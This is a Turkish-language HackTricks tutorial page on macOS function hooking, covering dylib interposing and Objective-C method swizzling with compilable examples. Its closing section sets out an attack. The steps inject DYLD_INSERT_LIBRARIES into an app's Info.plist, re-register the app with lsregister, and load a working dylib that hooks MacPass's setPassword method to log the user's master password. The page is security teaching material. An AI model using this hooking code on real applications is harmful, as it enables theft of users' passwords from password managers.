# macOS Function Hooking

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek isterseniz** veya **HackTricks'i PDF olarak indirmek isterseniz** [**ABONELİK PLANLARINI**](https://github.com/sponsors/carlospolop) kontrol edin!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'ı takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna **PR göndererek paylaşın**.

</details>

## Fonksiyon Interposing

Bir **dylib** oluşturun ve **`__interpose`** bölümü (veya **`S_INTERPOSING`** ile işaretlenmiş bir bölüm) içeren **fonksiyon işaretçileri**nden oluşan demetler oluşturun. Bu demetler, **orijinal** ve **değiştirme** fonksiyonlarına işaret eder.

Ardından, dylib'i **`DYLD_INSERT_LIBRARIES`** ile **enjekte edin** (interposing, ana uygulama yüklenmeden önce gerçekleşmelidir). Açıkçası, [**`DYLD_INSERT_LIBRARIES`** kullanımına uygulanan **kısıtlamalar** burada da geçerlidir](macos-library-injection/#check-restrictions).

### printf'i Interpose Et

{% tabs %}
{% tab title="interpose.c" %}
{% code title="interpose.c" %}
```c
// gcc -dynamiclib interpose.c -o interpose.dylib
#include <stdio.h>
#include <stdarg.h>

int my_printf(const char *format, ...) {
//va_list args;
//va_start(args, format);
//int ret = vprintf(format, args);
//va_end(args);

int ret = printf("Hello from interpose\n");
return ret;
}

__attribute__((used)) static struct { const void *replacement; const void *replacee; } _interpose_printf
__attribute__ ((section ("__DATA,__interpose"))) = { (const void *)(unsigned long)&my_printf, (const void *)(unsigned long)&printf };
```
{% endcode %}
{% endtab %}

{% tab title="undefined" %}
```c
//gcc hello.c -o hello
#include <stdio.h>

int main() {
printf("Hello World!\n");
return 0;
}
```
{% endtab %}

{% tab title="interpose2.c" %}
```c
#include <stdio.h>
#include <stdlib.h>
#include <dlfcn.h>

// Function pointer type for the original function
typedef int (*orig_open_type)(const char *pathname, int flags);

// Function pointer type for the interposed function
typedef int (*interposed_open_type)(const char *pathname, int flags);

// Define the interposed function
int interposed_open(const char *pathname, int flags) {
    printf("Interposed open called with pathname: %s\n", pathname);
    
    // Call the original function
    orig_open_type orig_open = (orig_open_type)dlsym(RTLD_NEXT, "open");
    return orig_open(pathname, flags);
}

// Constructor function to register the interposed function
__attribute__((constructor))
void interpose_open() {
    printf("Interposing open function\n");
    
    // Get the handle to the dynamic linker
    void *handle = dlopen(NULL, RTLD_NOW);
    
    // Get the address of the original function
    orig_open_type orig_open = (orig_open_type)dlsym(handle, "open");
    
    // Get the address of the interposed function
    interposed_open_type interposed_open = (interposed_open_type)interposed_open;
    
    // Replace the original function with the interposed function
    if (orig_open && interposed_open) {
        printf("Replacing open function\n");
        interposed_open = orig_open;
    }
    
    // Close the handle to the dynamic linker
    dlclose(handle);
}
```

Bu örnek, `open` işlevini interpose eden bir C programıdır. İnterpose edilen işlev, `open` işlevini çağıran ve çağrılan dosya yolunu yazdıran bir işlevdir. İnterpose edilen işlev, `dlsym` işlevi kullanılarak orijinal işlevin adresini alır ve ardından bu adresi kullanarak orijinal işlevi çağırır. İnterpose edilen işlev, `dlopen` işlevi kullanılarak dinamik bağlayıcının tutamağını alır ve ardından orijinal işlevin adresini alır. Son olarak, orijinal işlevin yerine interpose edilen işlev atanır.

```c
// Just another way to define an interpose
// gcc -dynamiclib interpose2.c -o interpose2.dylib

#include <stdio.h>

#define DYLD_INTERPOSE(_replacement, _replacee) \
__attribute__((used)) static struct { \
const void* replacement; \
const void* replacee; \
} _interpose_##_replacee __attribute__ ((section("__DATA, __interpose"))) = { \
(const void*) (unsigned long) &_replacement, \
(const void*) (unsigned long) &_replacee \
};

int my_printf(const char *format, ...)
{
int ret = printf("Hello from interpose\n");
return ret;
}

DYLD_INTERPOSE(my_printf,printf);
```
{% endtab %}
{% endtabs %}

```bash
DYLD_INSERT_LIBRARIES=./interpose.dylib ./hello
Hello from interpose

DYLD_INSERT_LIBRARIES=./interpose2.dylib ./hello
Hello from interpose
```

## Yöntem Swizzling

ObjectiveC'de bir yöntem şu şekilde çağrılır: **`[myClassInstance nameOfTheMethodFirstParam:param1 secondParam:param2]`**

**Nesne**, **yöntem** ve **parametreler** gereklidir. Ve bir yöntem çağrıldığında bir **mesaj gönderilir** ve bunun için **`objc_msgSend`** fonksiyonu kullanılır: `int i = ((int (*)(id, SEL, NSString *, NSString *))objc_msgSend)(someObject, @selector(method1p1:p2:), value1, value2);`

Nesne **`someObject`**, yöntem **`@selector(method1p1:p2:)`** ve argümanlar **value1**, **value2**'dir.

Nesne yapılarına göre, yöntemlerin **isimlerine** ve **yöntem kodunun işaretçilerine** ulaşmak mümkündür.

{% hint style="danger" %}
Yöntemler ve sınıflar isimlerine göre erişildiği için bu bilgiler ikili dosyada saklanır, bu yüzden `otool -ov </path/bin>` veya [`class-dump </path/bin>`](https://github.com/nygard/class-dump) ile geri alınabilir.
{% endhint %}

### Ham yöntemlere erişim

Aşağıdaki örnekte olduğu gibi yöntemlerin isimleri, parametre sayısı veya adres gibi bilgilere erişmek mümkündür:

```objectivec
// gcc -framework Foundation test.m -o test

#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

int main() {
// Get class of the variable
NSString* str = @"This is an example";
Class strClass = [str class];
NSLog(@"str's Class name: %s", class_getName(strClass));

// Get parent class of a class
Class strSuper = class_getSuperclass(strClass);
NSLog(@"Superclass name: %@",NSStringFromClass(strSuper));

// Get information about a method
SEL sel = @selector(length);
NSLog(@"Selector name: %@", NSStringFromSelector(sel));
Method m = class_getInstanceMethod(strClass,sel);
NSLog(@"Number of arguments: %d", method_getNumberOfArguments(m));
NSLog(@"Implementation address: 0x%lx", (unsigned long)method_getImplementation(m));

// Iterate through the class hierarchy
NSLog(@"Listing methods:");
Class currentClass = strClass;
while (currentClass != NULL) {
unsigned int inheritedMethodCount = 0;
Method* inheritedMethods = class_copyMethodList(currentClass, &inheritedMethodCount);

NSLog(@"Number of inherited methods in %s: %u", class_getName(currentClass), inheritedMethodCount);

for (unsigned int i = 0; i < inheritedMethodCount; i++) {
Method method = inheritedMethods[i];
SEL selector = method_getName(method);
const char* methodName = sel_getName(selector);
unsigned long address = (unsigned long)method_getImplementation(m);
NSLog(@"Inherited method name: %s (0x%lx)", methodName, address);
}

// Free the memory allocated by class_copyMethodList
free(inheritedMethods);
currentClass = class_getSuperclass(currentClass);
}

// Other ways to call uppercaseString method
if([str respondsToSelector:@selector(uppercaseString)]) {
NSString *uppercaseString = [str performSelector:@selector(uppercaseString)];
NSLog(@"Uppercase string: %@", uppercaseString);
}

// Using objc_msgSend directly
NSString *uppercaseString2 = ((NSString *(*)(id, SEL))objc_msgSend)(str, @selector(uppercaseString));
NSLog(@"Uppercase string: %@", uppercaseString2);

// Calling the address directly
IMP imp = method_getImplementation(class_getInstanceMethod(strClass, @selector(uppercaseString))); // Get the function address
NSString *(*callImp)(id,SEL) = (typeof(callImp))imp; // Generates a function capable to method from imp
NSString *uppercaseString3 = callImp(str,@selector(uppercaseString)); // Call the method
NSLog(@"Uppercase string: %@", uppercaseString3);

return 0;
}
```

### method\_exchangeImplementations ile Method Swizzling

**method\_exchangeImplementations** fonksiyonu, bir fonksiyonun **uygulamasının adresini diğerine değiştirmeyi** sağlar.

{% hint style="danger" %}
Bu nedenle bir fonksiyon çağrıldığında **çalıştırılan diğer fonksiyondur**.
{% endhint %}

```objectivec
//gcc -framework Foundation swizzle_str.m -o swizzle_str

#import <Foundation/Foundation.h>
#import <objc/runtime.h>


// Create a new category for NSString with the method to execute
@interface NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (SwizzleString)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original method
return [self swizzledSubstringFromIndex:from];
}

@end

int main(int argc, const char * argv[]) {
// Perform method swizzling
Method originalMethod = class_getInstanceMethod([NSString class], @selector(substringFromIndex:));
Method swizzledMethod = class_getInstanceMethod([NSString class], @selector(swizzledSubstringFromIndex:));
method_exchangeImplementations(originalMethod, swizzledMethod);

// We changed the address of one method for the other
// Now when the method substringFromIndex is called, what is really called is swizzledSubstringFromIndex
// And when swizzledSubstringFromIndex is called, substringFromIndex is really colled

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

return 0;
}
```

{% hint style="warning" %}
Bu durumda, **meşru** yöntemin **uygulama kodu** **yöntem adını doğrularsa**, bu swizzling'i **tespit edebilir** ve çalışmasını engelleyebilir.

Aşağıdaki teknikte bu kısıtlama yoktur.
{% endhint %}

### method\_setImplementation ile Yöntem Swizzling

Önceki format garip çünkü bir yöntemin uygulamasını diğerine değiştiriyorsunuz. **`method_setImplementation`** fonksiyonunu kullanarak bir yöntemin uygulamasını diğerinin uygulamasıyla değiştirebilirsiniz.

Sadece, yeni uygulamadan önce orijinalinin uygulama adresini saklamayı unutmayın, çünkü daha sonra o adresi bulmak çok daha karmaşık olacaktır.

```objectivec
#import <Foundation/Foundation.h>
#import <objc/runtime.h>
#import <objc/message.h>

static IMP original_substringFromIndex = NULL;

@interface NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from;

@end

@implementation NSString (Swizzlestring)

- (NSString *)swizzledSubstringFromIndex:(NSUInteger)from {
NSLog(@"Custom implementation of substringFromIndex:");

// Call the original implementation using objc_msgSendSuper
return ((NSString *(*)(id, SEL, NSUInteger))original_substringFromIndex)(self, _cmd, from);
}

@end

int main(int argc, const char * argv[]) {
@autoreleasepool {
// Get the class of the target method
Class stringClass = [NSString class];

// Get the swizzled and original methods
Method originalMethod = class_getInstanceMethod(stringClass, @selector(substringFromIndex:));

// Get the function pointer to the swizzled method's implementation
IMP swizzledIMP = method_getImplementation(class_getInstanceMethod(stringClass, @selector(swizzledSubstringFromIndex:)));

// Swap the implementations
// It return the now overwritten implementation of the original method to store it
original_substringFromIndex = method_setImplementation(originalMethod, swizzledIMP);

// Example usage
NSString *myString = @"Hello, World!";
NSString *subString = [myString substringFromIndex:7];
NSLog(@"Substring: %@", subString);

// Set the original implementation back
method_setImplementation(originalMethod, original_substringFromIndex);

return 0;
}
}
```

## Hooking Saldırı Metodolojisi

Bu sayfada, fonksiyonları kancalamak için farklı yöntemler tartışıldı. Ancak, bunlar **saldırı yapmak için işlem içinde kod çalıştırmayı** gerektiriyordu.

Bunu yapmak için kullanılabilecek en kolay teknik, [Dyld aracılığıyla çevre değişkenleri veya kaçırma](macos-library-injection/macos-dyld-hijacking-and-dyld\_insert\_libraries.md) enjekte etmektir. Bununla birlikte, bunun aynı zamanda [Dylib işlem enjeksiyonu](macos-ipc-inter-process-communication/#dylib-process-injection-via-task-port) yoluyla da yapılabilmesi mümkündür.

Ancak, her iki seçenek de **korumasız** ikili/işlemlerle **sınırlıdır**. Sınırlamalar hakkında daha fazla bilgi edinmek için her tekniği kontrol edin.

Ancak, bir fonksiyon kancalama saldırısı çok spesifik bir saldırıdır, bir saldırgan bunu yaparak bir işlem içinden **hassas bilgileri çalmayı** amaçlar (aksi takdirde bir işlem enjeksiyon saldırısı yapardınız). Ve bu hassas bilgiler, MacPass gibi kullanıcı tarafından indirilen Uygulamalar içinde bulunabilir.

Bu nedenle, saldırganın vektörü, ya bir zafiyet bulmak ya da uygulamanın imzasını kaldırmak, uygulamanın Info.plist dosyasına **`DYLD_INSERT_LIBRARIES`** çevre değişkenini enjekte etmek olacaktır. Buna benzer bir şey eklemek:

```xml
<key>LSEnvironment</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/Applications/Application.app/Contents/malicious.dylib</string>
</dict>
```

ve ardından uygulamayı **yeniden kaydetmek**:

{% code overflow="wrap" %}
```bash
/System/Library/Frameworks/CoreServices.framework/Frameworks/LaunchServices.framework/Support/lsregister -f /Applications/Application.app
```
{% endcode %}

Bu kütüphaneye, bilgileri dışarı çıkarmak için kancalama kodunu ekleyin: Şifreler, mesajlar...

{% hint style="danger" %}
Yeni macOS sürümlerinde, uygulama ikili dosyasının imzasını **kaldırırsanız** ve daha önce çalıştırılmışsa, macOS artık uygulamayı **çalıştırmayacaktır**.
{% endhint %}

#### Kütüphane örneği

```objectivec
// gcc -dynamiclib -framework Foundation sniff.m -o sniff.dylib

// If you added env vars in the Info.plist don't forget to call lsregister as explained before

// Listen to the logs with something like:
// log stream --style syslog --predicate 'eventMessage CONTAINS[c] "Password"'

#include <Foundation/Foundation.h>
#import <objc/runtime.h>

// Here will be stored the real method (setPassword in this case) address
static IMP real_setPassword = NULL;

static BOOL custom_setPassword(id self, SEL _cmd, NSString* password, NSURL* keyFileURL)
{
// Function that will log the password and call the original setPassword(pass, file_path) method
NSLog(@"[+] Password is: %@", password);

// After logging the password call the original method so nothing breaks.
return ((BOOL (*)(id,SEL,NSString*, NSURL*))real_setPassword)(self, _cmd,  password, keyFileURL);
}

// Library constructor to execute
__attribute__((constructor))
static void customConstructor(int argc, const char **argv) {
// Get the real method address to not lose it
Class classMPDocument = NSClassFromString(@"MPDocument");
Method real_Method = class_getInstanceMethod(classMPDocument, @selector(setPassword:keyFileURL:));

// Make the original method setPassword call the fake implementation one
IMP fake_IMP = (IMP)custom_setPassword;
real_setPassword = method_setImplementation(real_Method, fake_IMP);
}
```

## Referanslar

* [https://nshipster.com/method-swizzling/](https://nshipster.com/method-swizzling/)

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahraman olmaya kadar öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* Şirketinizi HackTricks'te **reklamınızı görmek** veya **HackTricks'i PDF olarak indirmek** için [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* Özel [**NFT'lerden**](https://opensea.io/collection/the-peass-family) oluşan koleksiyonumuz olan [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) **katılın** veya **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)'u **takip edin**.
* **Hacking hilelerinizi** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına **PR göndererek** paylaşın.

</details>
